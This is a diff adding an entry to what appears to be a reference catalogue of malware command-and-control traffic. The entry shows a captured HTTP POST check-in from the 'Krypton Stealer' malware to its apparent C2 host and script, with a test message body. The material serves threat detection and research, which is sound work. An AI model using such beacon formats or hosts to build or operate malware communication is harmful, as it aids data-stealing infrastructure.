@@ -800,6 +800,20 @@ jg==
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krugbot.png "Krugbot")
 
+#### Krypton Stealer
+~~~
+POST /connect_meta.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Client
+Host: orl05511cn.temp.swtest.ru
+Content-Length: 26
+Cache-Control: no-cache
+
+id=01&message=test_message
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")
+
 #### Loda
 I've never seen this without the beta flah
 ~~~
